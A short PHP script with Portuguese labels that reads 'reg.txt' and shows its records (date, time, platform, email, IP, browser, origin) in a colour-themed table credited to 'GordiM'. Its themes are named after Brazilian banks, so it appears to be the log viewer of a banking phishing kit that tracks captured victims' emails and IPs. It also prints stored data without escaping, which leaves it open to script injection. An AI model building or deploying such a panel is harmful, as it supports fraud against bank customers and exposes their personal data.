<?php 
if (!file_exists("reg.txt"))
{exit("!! ERRO !! reg.txt n&#227;o encontrado!");}

if (!isset($_GET['t'])) { $i = 0; } else { $i = $_GET['t']; }
if (!$i) { $i = 0; }
switch ($i) {
   case 0: //dark azul
         $cnormal = "#003333";
		 $chover = "#002424";
		 $ctable = "#eeeeee";
		 $cfundo = "#001229";
         break;
   case 1: //santa ou desk
         $cnormal = "#33000B";
		 $chover = "#B40404";
		 $ctable = "#eeeeee";
		 $cfundo = "#8A0808";
		 break;
   case 2: //ita
         $cnormal = "#513500";
		 $chover = "#FF8000";
		 $ctable = "#eeeeee";
		 $cfundo = "#DF7401";
		 break;
   case 3: //bb
         $cnormal = "#011046";
		 $chover = "#084B8A";
		 $ctable = "#eeeeee";
		 $cfundo = "#FFBF00";
		 break;
}

$registos = file("reg.txt");
$linha    = @count($registos);
echo '<html><head><title>Total: '.$linha.' - by GordiM</title>
<script type="text/javascript">
    var TableBackgroundNormalColor = "'.$cnormal.'";
    var TableBackgroundMouseoverColor = "'.$chover.'";
    function ChangeBackgroundColor(row) {
        row.style.backgroundColor = TableBackgroundMouseoverColor;
    }

    function RestoreBackgroundColor(row) {
        row.style.backgroundColor = TableBackgroundNormalColor;
    }
</script>
</head><body style="background:'.$cfundo.';color: #FFFFFF;TEXT-DECORATION: none; FONT-WEIGHT: normal; FONT-FAMILY: Arial, Verdana, Helvetica; FONT-SIZE: 13px"><h2><center>Total: '.$linha.'</h2><hr />';
echo '<table width="100%" style="background: #0;border:0px solid #49373A"; align="center">';

echo '<tr>
       <th><font color="white"> Data </font></th>
      <th><font color="white"> Hora  </font></th>
      <th><font color="white"> Plataforma  </font></th>
      <th><font color="white"> Email  </font></th>
      <th><font color="white"> IP </font></th>
      <th><font color="white"> Navegador </font></th>
      <th><font color="white"> Origem </th>
     </tr>';

for ($i = $linha-1; $i >= 0; $i--) {

$resultado = @explode("**",$registos[$i]);



echo "<tr onmouseover=\"ChangeBackgroundColor(this)\" onmouseout=\"RestoreBackgroundColor(this)\" style=\"color:$ctable; background:$cnormal; font-weight: normal;\">
        <td align=\"center\" width=\"7%\" >$resultado[0]</td>
        <td align=\"center\" width=\"7%\" >$resultado[1]</td>
        <td align=\"center\" width=\"7%\" >$resultado[2]</td>
        <td align=\"center\" width=\"10%\" >$resultado[3]</td>
	<td align=\"center\" width=\"20%\" >$resultado[4]</td>
        <td align=\"center\" width=\"7%\" >$resultado[5]</td>
        <td align=\"center\" width=\"15%\" >$resultado[6]</td>
      </tr>";
}

echo "</table></center></body></html>\n";
?>                              